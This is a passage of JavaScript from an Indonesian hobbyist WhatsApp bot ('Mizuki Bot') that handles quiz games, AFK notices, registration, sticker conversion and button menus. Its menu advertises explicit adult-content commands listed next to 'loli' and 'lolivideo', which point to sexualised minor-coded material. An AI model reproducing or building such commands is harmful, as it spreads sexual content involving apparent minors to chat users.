                    }
                }
            }
        }
        if (isGroup && isBaileys) {
            if (mentioned.length >= groupMembers.length){
                if (!chats.match(/(@)/gi)) {
                    mentions(`Terdeteksi @${sender.split('@')[0]} melakukan hidetag`, [sender], false)
                }
            }
        }
  //// kontol 
async function uptotele(path){
var linknya = await tele.uploadByBuffer(fs.readFileSync(path))
return linknya.link
         }
        
        // Sewa
             _sewa.expiredCheck(dimas, sewa)
             
        // MUTE
             if (isMuted){
             if (!isGroupAdmins && !isPremium) return
 }


            
              const getWin = (userId) => {
              let position = false
              Object.keys(_win).forEach((i) => {
              if (_win[i].jid === userId) {
              position = i
       }
        })
              if (position !== false) {
              return _win[position].win
            }
        }
      // GAME 
             game.cekWaktuFam(dimas, family100)
          
            if (tebakgambar.hasOwnProperty(sender.split('@')[0]) && !isCmd) {
                kuis = true
                jawaban = tebakgambar[sender.split('@')[0]]
                if (budy.toLowerCase() == jawaban) {
                	var http = randomNomor(100)
                    atm.addKoinUser(sender, http, _uang)
                    await reply(`*_🎮 Tebak Gambar  🎮_*\n\n*•* *Jawaban Benar🎉*\n*•* *Mendapatkan* : _Rp ${http} 💰_\n\nIngin bermain lagi? kirim *${prefix}tebakgambar*`)
                    delete tebakgambar[sender.split('@')[0]]
                    fs.writeFileSync("./database/tebakgambar.json", JSON.stringify(tebakgambar))
                }
            }
        if (game.isfam(from, family100)) {
            var anjuy = game.getjawaban100(from, family100)
            for (let i of anjuy){
                if (budy.toLowerCase().includes(i)){
                    var htgmp = Math.floor(Math.random() * 20) + 1
                    atm.addKoinUser(sender, htgmp, _uang)
                    await reply(`*Jawaban benar*\n*Jawaban :* ${i}\n*Hadiah :* $${htgmp}\n*Jawaban yang blum tertebak :* ${anjuy.length - 1}`)
                    var anug = anjuy.indexOf(i)
                    anjuy.splice(anug, 1)
                }
            }
            if (anjuy.length < 1){
                dimas.sendMessage(from, `Semua jawaban sudah tertebak\nKirim *${prefix}family100* untuk bermain lagi`, text)
                family100.splice(game.getfamposi(from, family100), 1)
            }
       }
            if (tebakanime.hasOwnProperty(sender.split('@')[0]) && !isCmd) {
                kuis = true
                jawaban = tebakanime[sender.split('@')[0]]
                if (budy.toLowerCase() == jawaban) {
                	var htgmu = randomNomor(100)
                    atm.addKoinUser(sender, htgmu, _uang)
                    await reply(`*_🎮 Tebak Anime 🎮_*\n\n*•* *Jawaban Benar🎉*\n*•* *Mendapatkan* : _Rp ${htgmu} 💰_\n\nIngin bermain lagi? kirim *${prefix}tebakanime*`)
                    delete tebakanime[sender.split('@')[0]]
                    fs.writeFileSync("./database/tebakanime.json", JSON.stringify(tebakanime))
                }
            }
            if (tebaklagu.hasOwnProperty(sender.split('@')[0]) && !isCmd) {
                kuis = true
                jawaban = tebaklagu[sender.split('@')[0]]
                if (budy.toLowerCase() == jawaban) {
                	var htpl = randomNomor(100)
                    atm.addKoinUser(sender, htpl, _uang)
                    await reply(`*_🎮 Tebak Lagu 🎮_*\n\n*•* *Jawaban Benar🎉*\n*•* *Mendapatkan* : _Rp ${htpl} 💰_\n\nIngin bermain lagi? kirim *${prefix}tebaklagu*`)
                    delete tebaklagu[sender.split('@')[0]]
                    fs.writeFileSync("./database/tebaklagu.json", JSON.stringify(tebaklagu))
                }
            }
            if (tebaktebakan.hasOwnProperty(sender.split('@')[0]) && !isCmd) {
                kuis = true
                jawaban = tebaktebakan[sender.split('@')[0]]
                if (budy.toLowerCase() == jawaban) {
                	var htpu = randomNomor(100)
                    atm.addKoinUser(sender, htpu, _uang)
                    await reply(`*_🎮 Tebak Tebakan 🎮_*\n\n*•* *Jawaban Benar🎉*\n*•* *Mendapatkan* : _Rp ${htpu} 💰_\n\nIngin bermain lagi? kirim *${prefix}tebaktebakan*`)
                    delete tebaktebakan[sender.split('@')[0]]
                    fs.writeFileSync("./database/tebaktebakan.json", JSON.stringify(tebaktebakan))                    
                }
            }
            if (kuismath.hasOwnProperty(sender.split('@')[0]) && !isCmd) {
                kuis = true
                jawaban = kuismath[sender.split('@')[0]]
                if (budy.toLowerCase() == jawaban) {
                	var htcc = randomNomor(100)
                    atm.addKoinUser(sender, htcc, _uang)
                    await reply(`*_🎮 Kuis Matematika  🎮_*\n\n*•* *Jawaban Benar🎉*\n*•* *Mendapatkan* : _Rp ${htcc} 💰_\n\nIngin bermain lagi? kirim *${prefix}kuismath*`)
                    delete kuismath[sender.split('@')[0]]
                    fs.writeFileSync("./database/kuismath.json", JSON.stringify(kuismath))
                }
            }
          if (asahotak.hasOwnProperty(sender.split('@')[0]) && !isCmd) {
                kuis = true
                jawaban = asahotak[sender.split('@')[0]]
                if (budy.toLowerCase() == jawaban) {
                	var htgm = randomNomor(100)
                    atm.addKoinUser(sender, htgm, _uang)
                    await reply(`*_🎮 Asah Otak  🎮_*\n\n*•* *Jawaban Benar🎉*\n*•* *Mendapatkan* : _Rp ${htgm} 💰_\n\nIngin bermain lagi? kirim *${prefix}asahotak*`)
                    delete asahotak[sender.split('@')[0]]
                    fs.writeFileSync("./database/asahotak.json", JSON.stringify(asahotak))
                }
            }
          if (caklontong.hasOwnProperty(sender.split('@')[0]) && !isCmd) {
                kuis = true
                jawaban = caklontong[sender.split('@')[0]]
                if (budy.toLowerCase() == jawaban) {
                	var htgmi = randomNomor(100)
                    atm.addKoinUser(sender, htgmi, _uang)
                    await reply(`*_🎮 Caklontong  🎮_*\n\n*•* *Jawaban Benar🎉*\n*•* *Mendapatkan* : _Rp ${htgmi} 💰_\n\nIngin bermain lagi? kirim *${prefix}caklontong*`)
                    delete caklontong[sender.split('@')[0]]
                    fs.writeFileSync("./database/caklontong.json", JSON.stringify(caklontong))
                }
            }
          if (tebakjenaka.hasOwnProperty(sender.split('@')[0]) && !isCmd) {
                kuis = true
                jawaban = tebakjenaka[sender.split('@')[0]]
                if (budy.toLowerCase() == jawaban) {
                	var htgmuu = randomNomor(100)
                    atm.addKoinUser(sender, htgmuu, _uang)
                    await reply(`*_🎮 Tebak Jenaka  🎮_*\n\n*•* *Jawaban Benar🎉*\n*•* *Mendapatkan* : _Rp ${htgmuu} 💰_\n\nIngin bermain lagi? kirim *${prefix}tebakjenaka*`)
                    delete tebakjenaka[sender.split('@')[0]]
                    fs.writeFileSync("./database/tebakjenaka.json", JSON.stringify(tebakjenaka))
                }
            }
            if (tebaklirik.hasOwnProperty(sender.split('@')[0]) && !isCmd) {
                kuis = true
                jawaban = tebaklirik[sender.split('@')[0]]
                if (budy.toLowerCase() == jawaban) {
                	var htgmii = randomNomor(100)
                    atm.addKoinUser(sender, htgmii, _uang)
                    await reply(`*_🎮 Tebak Lirik 🎮_*\n\n*•* *Jawaban Benar🎉*\n*•* *Mendapatkan* : _Rp ${htgmii} 💰_\n\nIngin bermain lagi? kirim *${prefix}tebaklirik*`)
                    delete tebaklirik[sender.split('@')[0]]
                    fs.writeFileSync("./database/tebaklirik.json", JSON.stringify(tebaklirik))
                }
            }
            if (tebakimia.hasOwnProperty(sender.split('@')[0]) && !isCmd) {
                kuis = true
                jawaban = tebakimia[sender.split('@')[0]]
                if (budy.toLowerCase() == jawaban) {
                	var htgmcc = randomNomor(100)
                    atm.addKoinUser(sender, htgmcc, _uang)
                    await reply(`*_🎮 Tebak Kimia 🎮_*\n\n*•* *Jawaban Benar🎉*\n*•* *Mendapatkan* : _Rp ${htgmcc} 💰_\n\nIngin bermain lagi? kirim *${prefix}tebakkimia*`)
                    delete tebakimia[sender.split('@')[0]]
                    fs.writeFileSync("./database/tebakimia.json", JSON.stringify(tebakimia))
                }
            }
          if (tebaksiapaaku.hasOwnProperty(sender.split('@')[0]) && !isCmd) {
                kuis = true
                jawaban = tebaksiapaaku[sender.split('@')[0]]
                if (budy.toLowerCase() == jawaban) {
                	var htgmk = randomNomor(100)
                    atm.addKoinUser(sender, htgmk, _uang)
                    await reply(`*_🎮 Tebak Siapakah Aku  🎮_*\n\n*•* *Jawaban Benar🎉*\n*•* *Mendapatkan* : _Rp ${htgmk} 💰_\n\nIngin bermain lagi? kirim *${prefix}tebaksiapaaku*`)
                    delete tebaksiapaaku[sender.split('@')[0]]
                    fs.writeFileSync("./database/tebaksiapaaku.json", JSON.stringify(tebaksiapaaku))
                }
            }
          if (tebakbendera.hasOwnProperty(sender.split('@')[0]) && !isCmd) {
                kuis = true
                jawaban = tebakbendera[sender.split('@')[0]]
                if (budy.toLowerCase() == jawaban) {
                	var html = randomNomor(100)
                    atm.addKoinUser(sender, html, _uang)
                    await reply(`*_🎮 Tebak Bendera  🎮_*\n\n*•* *Jawaban Benar🎉*\n*•* *Mendapatkan* : _Rp ${html} 💰_\n\nIngin bermain lagi? kirim *${prefix}tebakbendera*`)
                    delete tebakbendera[sender.split('@')[0]]
                    fs.writeFileSync("./database/tebakbendera.json", JSON.stringify(tebakbendera))
                }
            }
          if (susunkata.hasOwnProperty(sender.split('@')[0]) && !isCmd) {
                kuis = true
                jawaban = susunkata[sender.split('@')[0]]
                if (budy.toLowerCase() == jawaban) {
                	var htmp = randomNomor(100)
                    atm.addKoinUser(sender, htmp, _uang)
                    await reply(`*_🎮 Susun Kata  🎮_*\n\n*•* *Jawaban Benar🎉*\n*•* *Mendapatkan* : _Rp ${htmp} 💰_\n\nIngin bermain lagi? kirim *${prefix}susunkata*`)
                    delete susunkata[sender.split('@')[0]]
                    fs.writeFileSync("./database/susunkata.json", JSON.stringify(susunkata))
                }
            }
          if (tebakata.hasOwnProperty(sender.split('@')[0]) && !isCmd) {
                kuis = true
                jawaban = tebakata[sender.split('@')[0]]
                if (budy.toLowerCase() == jawaban) {
                	var htmu = randomNomor(100)
                    atm.addKoinUser(sender, htmu, _uang)
                    await reply(`*_🎮 Tebak Kata  🎮_*\n\n*•* *Jawaban Benar🎉*\n*•* *Mendapatkan* : _Rp ${htmu} 💰_\n\nIngin bermain lagi? kirim *${prefix}tebakkata*`)
                    delete tebakata[sender.split('@')[0]]
                    fs.writeFileSync("./database/tebakata.json", JSON.stringify(tebakata))
                }
            }
            const sendStickerUrl = async(to, url) => {
			console.log(color(time, 'magenta'), color(moment.tz('Asia/Jakarta').format('HH:mm:ss'), "gold"), color('Downloading sticker...'))
				var names = getRandom('.webp')
				var namea = getRandom('.png')
				var download = function (uri, filename, callback) {
					request.head(uri, function (err, res, body) {
						request(uri).pipe(fs.createWriteStream(filename)).on('close', callback);
					});
				};
				download(url, namea, async function () {
					let filess = namea
					let asw = names
					require('./lib/exif.js')
					exec(`ffmpeg -i ${filess} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${asw}`, (err) => {
					exec(`webpmux -set exif ./src/sticker/data.exif ${asw} -o ${asw}`, async (error) => {
					let media = fs.readFileSync(asw)
					dimas.sendMessage(to, media, sticker)
					console.log(color(time, 'magenta'), color(moment.tz('Asia/Jakarta').format('HH:mm:ss'), "gold"), color('Succes send sticker...'))
					});
					});
				});
			}
          // AFK
	if (isGroup) {
		if (!dim.key.fromMe && banChats === true) return
		for (let x of mentionUser) {
		    if (afk.checkAfkUser(x, _afk)) {
			const getId = afk.getAfkId(x, _afk)
			const getReason = afk.getAfkReason(getId, _afk)
			const getTime = afk.getAfkTime(getId, _afk)
			const cptl = `*「 AFK MODE 」*\n
*Sssttt! Orangnya lagi AFK, jangan diganggu!*
➸ *Alasan*  : ${getReason}
➸ *Sejak* : ${getTime}`
      mentions(cptl, x, true)
    }}
		if (afk.checkAfkUser(sender, _afk) && !isCmd) {
		    const getTime = afk.getAfkTime(sender, _afk)
		    const getReason = afk.getAfkReason(sender, _afk)
		    const ittung = ms(await Date.now() - getTime)
		    const pep = `*${pushname}* telah kembali dari AFK! Selamat datang kembali~`
		    reply(pep)
		    _afk.splice(afk.getAfkPosition(sender, _afk), 1)
		    fs.writeFileSync('./database/user/afk.json', JSON.stringify(_afk))
		}
	    }
	//
	    // Auto Read
        dimas.chatRead(from, "read")
        
       // CMD
        if (isCmd && !isGroup)
		    atm.addKoinUser(sender, randomNomor(20), _uang)
            console.log(color('[ CMD ]'), color(time, 'yellow'), color(`${command} [${args.length}]`), 'from', color(pushname))
        
        if (isCmd && isGroup)
            atm.addKoinUser(sender, randomNomor(20), _uang)
            console.log(color('[ CMD ]'), color(time, 'yellow'), color(`${command} [${args.length}]`), 'from', color(pushname), 'in', color(groupName))
            
        if (budy.toLowerCase() === `8473`){
		if (isRegister) return 
		    register.push(sender)
		    fs.writeFileSync('./database/user/register.json', JSON.stringify(register))
		    teks = `Verification success\n\nPlease send *!menu* to view menu`
		    atm.addKoinUser(sender, randomNomor(100), _uang)
		    dimas.sendMessage(from, teks, text, {quoted: freply })
}          if (!dim.key.fromMe && banChats === true) return 
	              switch(command){


                    
                    /* case 'verify':
              
if (isRegistered) return reply('Akun kamu sudah terverfikasi')
const serialUser = createSerial(18)
             try {
                                ppimg = await dimas.getProfilePicture(`${sender.split('@')[0]}@c.us`)
                                } catch {
                          ppimg = errorImg
                            }
            veri = sender
            _registered.push(sender)
            fs.writeFileSync('./database/user/register.json', JSON.stringify(_registered))
            addRegisteredUser(sender, serialUser)
             const anuu = `「 *PENDAFTARAN USER* 」
*Terimakasih Sudah Mendaftarkan Diri Dalam Database Bot WhatsApp*

*🌹 Nama :* ${pushname}
*🌹 API :* +${sender.split('@')[0]}
*🌹 Serial:* ${serialUser}
*🌹 Total:* ${_registered.length} Pengguna

*「 MIZUKI BOTZ 」*`
        buff = await getBuffer(ppimg)
    // buff = await getBuffer(`http://hadi-api.herokuapp.com/api/card/verify?nama=${encodeURI(pushname)}&member=${_registered.length}&seri=${serialUser}&pp=${ppimg}&bg=${ppimg}`)
        dimas.sendMessage(from, buff, MessageType.image, {caption: anuu, contextInfo: {"mentionedJid": [sender]}})
             console.log(color('[REGISTER]'), color(time, 'yellow'), 'Serial:', color(serialUser, 'cyan'), 'in', color(sender || groupName))
        // console.log(e)
            setTimeout( () => {
            dimas.updatePresence(from, Presence.composing)
            reply(`*Terimakasih Telah Terdaftar Di Mizuki Botz *`)
        }, 2000)
        break */
          case 'verify':
              
if (isRegistered) return reply('Akun kamu sudah terverfikasi')
const serialUser = createSerial(18)
             try {
                                ppimg = await dimas.getProfilePicture(`${sender.split('@')[0]}@c.us`)
                                } catch {
                                ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
                            }
            veri = sender
            _registered.push(sender)
            fs.writeFileSync('./database/user/registered.json', JSON.stringify(_registered))
            addRegisteredUser(sender, serialUser)
             const anuu = `「 *PENDAFTARAN USER* 」
*Terimakasih Sudah Mendaftarkan Diri Dalam Database Bot WhatsApp*

*🌹 Nama :* ${pushname}
*🌹 API :* +${sender.split('@')[0]}
*🌹 Serial:* ${serialUser}
*🌹 Total:* ${_registered.length} Pengguna

*「 MIZUKI BOT 」*`
         ikyads = await getBuffer(`http://hadi-api.herokuapp.com/api/card/verify?nama=${encodeURI(pushname)}&member=${_registered.length}&seri=${serialUser}&pp=${ppimg}&bg=${ppimg}`)
             buttons = [{buttonId: `!menu`,buttonText:{displayText: `🏷️MENU`},type:1}]
              imageMsg = (await dimas.prepareMessageMedia(ikyads, "imageMessage", { thumbnail: ikyads, })).imageMessage
              buttonsMessage = {footerText:'Jangan Lupa Donasi Ya Kak ☕', imageMessage: imageMsg,
              contentText:`${anuu}`,buttons,headerType:4}
              prep = await dimas.prepareMessageFromContent(from,{buttonsMessage},{quoted: freply})
              dimas.relayWAMessage(prep)
             console.log(color('[REGISTER]'), color(time, 'yellow'), 'Serial:', color(serialUser, 'cyan'), 'in', color(sender || groupName))
        // console.log(e)
            setTimeout( () => {
            dimas.updatePresence(from, Presence.composing)
            reply(`*Terimakasih Telah Terdaftar Di mizuki Botz*`)
        }, 2000)
        break 
        case 'owner':
        case 'creator':
               sendKontak(from, `${owner}`, `${ownerName}`, 'Sibukk!!')
               await sleep(1000)
               txtt =`Hai Kak ${pushname}\nItu Ownerku, Mau tau soal apa ya?`

               buttons = [{buttonId: '!sourcecode',buttonText:{displayText: 'SC BOT'},type:1},{buttonId:'!infoig',buttonText:{displayText:'INSTAGRAM'},type:1}]

               buttonsMessage = {
               contentText: `${txtt}`,
               footerText: 'Jangan Sungkan Chat Ya Kak',
               buttons: buttons,
               headerType: 1
}

               prep = await dimas.prepareMessageFromContent(from,{buttonsMessage},{})
               dimas.relayWAMessage(prep)
               break      
               const sendButImage = async(id, text1, desc1, gam1, but = [], options = {}) => {
kma = gam1
mhan = await dimas.prepareMessage(from, kma, image)
const buttonMessages = {
imageMessage: mhan.message.imageMessage,
contentText: text1,
footerText: desc1,
buttons: buttons,
   headerType: 4
}
dimas.sendMessage(id, buttonMessages, MessageType.buttonsMessage, options)
}

              
     /*  case 'help':
       case 'menu':
       
       if (!isRegistered) return sendButMessage(from, maaf, mod, tombar,{quoted:dim})
              timestampe = speed();
       groups = dimas.chats.array.filter(v => v.jid.endsWith('g.us'))
              privat = dimas.chats.array.filter(v => v.jid.endsWith('s.whatsapp.net'))
              ram2 = `${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)}MB / ${Math.round(require('os').totalmem / 1024 / 1024)}MB`
              charger = `${charging ? 'lagi dicas' : 'ga dicas'}`
              uptime = process.uptime();
              totalChat = await dimas.chats.all()
              latensie = speed() - timestampe
              total = math(`${groups.length}*${privat.length}`)
              
        menu =`${botName}
        

▢ 𝐆𝐫𝐨𝐮𝐩 𝐂𝐡𝐚𝐭𝐬 : *${groups.length}*
▢ 𝐏𝐫𝐢𝐯𝐚𝐭𝐞 𝐂𝐡𝐚𝐭𝐬 : *${privat.length}*
▢ 𝐁𝐚𝐭𝐞𝐫𝐚𝐢 : ${baterai}% ${charger}
▢ 𝐓𝐨𝐭𝐚𝐥 𝐂𝐡𝐚𝐭𝐬 : *${totalChat.length}*
▢ 𝐒𝐩𝐞𝐞𝐝 : *${latensie.toFixed(4)} _Second_*
▢ 𝐀𝐜𝐭𝐢𝐯𝐞 : *${runtime(process.uptime())}*
▢ 𝐏𝐥𝐚𝐭𝐟𝐨𝐫𝐦 : *${os.platform()}*

    
 𝐋𝐈𝐒𝐓 𝐌𝐄𝐍𝐔


┏━▹ 𝐠𝐫𝐨𝐮𝐩𝐦𝐞𝐧𝐮
┃
┗━▹ 𝐰𝐢𝐛𝐮𝐦𝐞𝐧𝐮 1/2

┏━▹ 𝐬𝐭𝐢𝐜𝐤𝐞𝐫𝐦𝐞𝐧𝐮
┃
┗━▹ 𝐨𝐰𝐧𝐞𝐫𝐦𝐞𝐧𝐮

┏━▹ 𝐠𝐚𝐦𝐞𝐦𝐞𝐧𝐮
┃
┗━▹ 𝐟𝐮𝐧𝐦𝐞𝐧𝐮

┏━▹ 𝐝𝐨𝐰𝐧𝐥𝐨𝐚𝐝𝐦𝐞𝐧𝐮
┃
┗━▹ 𝐢𝐧𝐟𝐨𝐦𝐞𝐧𝐮

┏━▹ 𝐨𝐭𝐡𝐞𝐫𝐦𝐞𝐧𝐮
┃
┗━▹ 𝐬𝐞𝐰𝐚𝐛𝐨𝐭

┏━▹ 18+𝐦𝐞𝐧𝐮
┃
┗━▹ 𝐢𝐬𝐥𝐚𝐦𝐦𝐞𝐧𝐮

┏━▹ 𝐫𝐚𝐧𝐝𝐨𝐦𝐭𝐞𝐱𝐭
┃
┗━▹ 𝐦𝐨𝐯𝐢𝐞𝐦𝐞𝐧𝐮

┏━▹ 𝐫𝐚𝐧𝐝𝐨𝐦𝐢𝐦𝐚𝐠𝐞
┃
┗━▹ 𝐞𝐩𝐡𝐨𝐭𝐨

┏━▹ 𝐩𝐡𝐨𝐭𝐨𝐤𝐲
┃
┗━▹ 𝐭𝐞𝐱𝐭𝐩𝐫𝐨


 𝔍𝔞𝔫𝔤𝔞𝔫 𝔭𝔢𝔯𝔫𝔞𝔥 𝔪𝔢𝔫𝔠𝔦𝔫𝔱𝔞𝔦 𝔰𝔢𝔰𝔢𝔬𝔯𝔞𝔫𝔤 
  𝔶𝔞𝔫𝔤 𝔪𝔞𝔰𝔦𝔥 𝔪𝔢𝔫𝔠𝔦𝔫𝔱𝔞𝔦 𝔪𝔞𝔰𝔞𝔩𝔞𝔩𝔲𝔫𝔶𝔞
`

              
                // ini_url = await fetchJson(`http://api.lolhuman.xyz/api/pinterest?apikey=${lol}&query=Cewe cantik`)
                //ini_url = ini_url.result
                ini_url = 'https://i.postimg.cc/CMrptwWV/IMG-20210508-WA0105.jpg'
                buff = await getBuffer(ini_url)
               buttons =  [{buttonId: `${prefix}command`, buttonText: {displayText: 'COMMAND'}, type: 1},{buttonId: `${prefix}rules`, buttonText: {displayText: 'RULES'}, type: 1},{buttonId: `${prefix}owner`, buttonText: {displayText: 'OWNER'}, type: 1},]
              imageMsg = (await dimas.prepareMessageMedia(buff, "imageMessage", { thumbnail: kiki, })).imageMessage
              buttonsMessage = {footerText:'@ M I Z U K I  B O T', imageMessage: imageMsg,
              contentText: menu,buttons,headerType:4}
              prep = await dimas.prepareMessageFromContent(from,{buttonsMessage},{quoted: freply})
              dimas.relayWAMessage(prep)
              break */
              /*╭❍ 𝐔𝐒𝐄𝐑 𝐒𝐓𝐀𝐓𝐔𝐒
├──────────────────
├❍ Name : Dimas
├❍ User : VIP
├❍ Tanggal : 02/09/21
├❍ Jam : 23:21:08
├❍ User BOT : 455 User
╰───────────────────
            
  ╭❍ *DIMAS BOT* 
 •├❍ Perintah BOT : 「 z 」
 •├❍ Limit BOT : 999999
 •├──────────────────
 •├❍ zlistmenu
 •├❍ zlistbanned
 •├❍ zlistblock
 •├❍ zlistgroup
 •├❍ zlistblock
 •├❍ zdaftarvip
 •├❍ zaddvip
 •├❍ zcekvip
 •├❍ zceklimit
 •├❍ zaddlimit   
 •├❍ zpanduan
 •├❍ zsnk
 •├❍ zowner
  ╰───────────────────
────────────────────
    ❍ Running : 
26 Jam, 26 Menit, 02 Detik
────────────────────*/
              case 'menu':
              case 'help':
              //if (isBanned) return reply('_*Maaf anda kena baned*_')
              if (!isRegistered) return sendButMessage(from, maaf, mod, tombar,{quoted:dim})
                if (isBanned) reply('_*Maaf anda kena baned*_')
       groups = dimas.chats.array.filter(v => v.jid.endsWith('g.us'))
              privat = dimas.chats.array.filter(v => v.jid.endsWith('s.whatsapp.net'))
              ram2 = `${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)}MB / ${Math.round(require('os').totalmem / 1024 / 1024)}MB`
              charger = `${charging ? 'lagi dicas' : 'ga dicas'}`
              uptime = process.uptime();
              timestampe = speed();
              totalChat = await dimas.chats.all()
              latensie = speed() - timestampe
              total = math(`${groups.length}*${privat.length}`)
              
        menu =`${botName}

*Haii ${pushname}*
*${ucapanWaktu}👋*

*Selamat datang di menu MIZUKI BOT*
*Mizuki akan membantu apa yang di butuhkan kakak seperti membuat sticker dan lain-lain.*
────────────────────
▢ *Active* : *${runtime(process.uptime())}*
────────────────────

*_Semoga bisa menggunakan bot dengan bijak_*

`
let ayang = fs.readFileSync('./media/kiki.jpg')
               buttons =  [{buttonId: `${prefix}allmenu`, buttonText: {displayText: '📜ALL MENU'}, type: 1},{buttonId: `${prefix}rules`, buttonText: {displayText: '✖RULES'}, type: 1},{buttonId: `${prefix}owner`, buttonText: {displayText: '👥CREATOR'}, type: 1},]

                    dimas.sendMessage(from, { contentText: menu, footerText: '_*Jika kalian pakai wa mod,bisa mengetik !command*_\n\n@Alwi Ofc', buttons: buttons, headerType: 'LOCATION', locationMessage: { degreesLatitude: '', degreesLongitude: '', jpegThumbnail: ayang, contextInfo: {mentionedJid: [sender]}}}, 'buttonsMessage', { quoted: dim})
   break
    case 'allmenu':
              if (!isRegistered) return sendButMessage(from, maaf, mod, tombar,{quoted:dim})
       groups = dimas.chats.array.filter(v => v.jid.endsWith('g.us'))
              privat = dimas.chats.array.filter(v => v.jid.endsWith('s.whatsapp.net'))
              ram2 = `${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)}MB / ${Math.round(require('os').totalmem / 1024 / 1024)}MB`
              charger = `${charging ? 'lagi dicas' : 'ga dicas'}`
              uptime = process.uptime();
              timestampe = speed();
              totalChat = await dimas.chats.all()
              latensie = speed() - timestampe
              total = math(`${groups.length}*${privat.length}`)
              
        menu =`${botName}

*Haii ${pushname}*
*${ucapanWaktu}👋*

*Selamat datang di menu MIZUKI-Bots BOT*
*By:Alwi Ofc*

▢ *Group* : *${groups.length}*
▢ *Private* : *${privat.length}*
▢ *Total User* : *${_registered.length} user*
▢ *Baterai* : *${baterai}% ${charger}*
▢ *Total Chats* : *${totalChat.length}*
▢ *Speed* : *${latensie.toFixed(4)} _Second_*
▢ *Platform* : *${os.platform()}*
▢ *Active* : *${runtime(process.uptime())}*
 
  ╭❍ *GROUP COMMAND*
 •├──────────────────
 •├❍ ${prefix}soundmenu
  ╰───────────────────
  ╭❍ *GROUP COMMAND*
 •├──────────────────
 •├❍ ${prefix}ɢʀᴏᴜᴘꜱᴇᴛᴛɪɴɢ
 •├❍ ${prefix}antilink enable/disable
 •├❍ ${prefix}antidel enable/disable
 •├❍ ${prefix}antiviewonce disable/enable
 •├❍ ${prefix}antivirtex disable/enable
 •├❍ ${prefix}me
 •├❍ ${prefix}tagme
 •├❍ ${prefix}ᴀꜰᴋ *ᴀʟᴀꜱᴀɴ*
 •├❍ ${prefix}ᴄᴇᴋꜱᴇᴡᴀ
 •├❍ ${prefix}ᴋɪᴄᴋᴀʟʟ
 •├❍ ${prefix}ɪɴꜰᴏɢʀᴜᴘ
 •├❍ ${prefix}ᴘʀᴏᴍᴏᴛᴇ
 •├❍ ${prefix}ᴅᴇᴍᴏᴛᴇ
 •├❍ ${prefix}ʟɪꜱᴛᴏɴʟɪɴᴇ
 •├❍ ${prefix}ᴛᴀɢᴀʟʟ *ᴛᴇᴋꜱ*
 •├❍ ${prefix}ʟᴇᴀᴠᴇ
 •├❍ ${prefix}ᴋɪᴄᴋ *ʀᴇᴘʟʏ*
 •├❍ ${prefix}ᴀᴅᴅ *+62xxxxxx*
 •├❍ ${prefix}ꜱᴇᴛɢʀᴜᴘɴᴀᴍᴇ
 •├❍ ${prefix}ꜱᴇᴛᴘᴘɢʀᴜᴘ
 •├❍ ${prefix}ꜱᴇᴛᴅᴇꜱᴄ
 •├❍ ${prefix}ꜱɪᴅᴇʀ *ʀᴇᴘʟʏ ᴄʜᴀᴛ ʙᴏᴛ*
 •├❍ ${prefix}ʜɪᴅᴇᴛᴀɢ *ᴛᴇᴋꜱ/ʀᴇᴘʟʏ ᴛᴇᴋꜱ*
  ╰───────────────────
  ╭❍ *OWMER MENU*
 •├──────────────────
 •├❍ ${prefix}bc *teks*
 •├❍ ${prefix}bc2 *teks*
 •├❍ ${prefix}term
 •├❍ ${prefix}self
 •├❍ ${prefix}public
 •├❍ ${prefix}eval
 •├❍ ${prefix}reset
 •├❍ ${prefix}clearall
 •├❍ ${prefix}leaveall
 •├❍ ${prefix}addvn
 •├❍ ${prefix}getvn
 •├❍ ${prefix}addimage
 •├❍ ${prefix}getimage
 •├❍ ${prefix}addvideo
 •├❍ ${prefix}getvideo
 •├❍ ${prefix}slow
 •├❍ ${prefix}leaveall
 •├❍ ${prefix}join *link gc*
 •├❍ ${prefix}shutdown
 •├❍ ${prefix}getquoted
 •├❍ ${prefix}addupdate *fiturnya*
 •├❍ ${prefix}exif *nama|author*
 •├❍ ${prefix}sewa add/del *waktunya*
 •├❍ ${prefix}premium add @tag|nomor
 •├❍ ${prefix}premium del @tag|nomor
  ╰───────────────────
  ╭❍ *NULIS MENU*
 •├──────────────────
 •├❍ ${prefix}nulis
 •├❍ ${prefix}nuliskiri
 •├❍ ${prefix}nuliskanan 
 •├❍ ${prefix}foliokiri
 •├❍ ${prefix}foliokanan
  ╰───────────────────
  ╭❍ *WIBU MENU*
 •├──────────────────
 •├❍ ${prefix}loli
 •├❍ ${prefix}manga
 •├❍ ${prefix}anime 
 •├❍ ${prefix}lolivideo
 •├❍ ${prefix}husbu
 •├❍ ${prefix}waifu
 •├❍ ${prefix}milf
 •├❍ ${prefix}neko
 •├❍ ${prefix}kanna
 •├❍ ${prefix}sagiri
 •├❍ ${prefix}hentai
 •├❍ ${prefix}cosplay
 •├❍ ${prefix}wallnime
 •├❍ ${prefix}kusonime
 •├❍ ${prefix}megumin
 •├❍ ${prefix}otakudesu
 •├❍ ${prefix}doujindesu
 •├❍ ${prefix}storyanime
 •├❍ ${prefix}nakanomiku
 •├❍ ${prefix}nakanoikyy
 •├❍ ${prefix}nakanoitsuki
 •├❍ ${prefix}otakuongoing
 •├❍ ${prefix}nhentai *code*
 •├❍ ${prefix}nekopoi *link*
 •├❍ ${prefix}nekopoi3d
 •├❍ ${prefix}nekopoicosplay
 •├❍ ${prefix}nekopoisearch
 •├❍ ${prefix}chiisaihentai
 •├❍ ${prefix}trap
 •├❍ ${prefix}blowjob
 •├❍ ${prefix}yaoi
 •├❍ ${prefix}ecchi
 •├❍ ${prefix}hentai
 •├❍ ${prefix}ahegao
 •├❍ ${prefix}hololewd
 •├❍ ${prefix}sideoppai
 •├❍ ${prefix}animefeets
 •├❍ ${prefix}animebooty
 •├❍ ${prefix}animethighss
 •├❍ ${prefix}hentaiparadise
 •├❍ ${prefix}animearmpits
 •├❍ ${prefix}hentaifemdom
 •├❍ ${prefix}lewdanimegirls
 •├❍ ${prefix}biganimetiddies
 •├❍ ${prefix}animebellybutton
 •├❍ ${prefix}hentai4everyone
  ╰───────────────────
  ╭❍ *TEXT PRO*
 •├──────────────────
 •├❍ ${prefix}blackpink text
 •├❍ ${prefix}neon text
 •├❍ ${prefix}greenneon text
 •├❍ ${prefix}advanceglow text
 •├❍ ${prefix}futureneon text
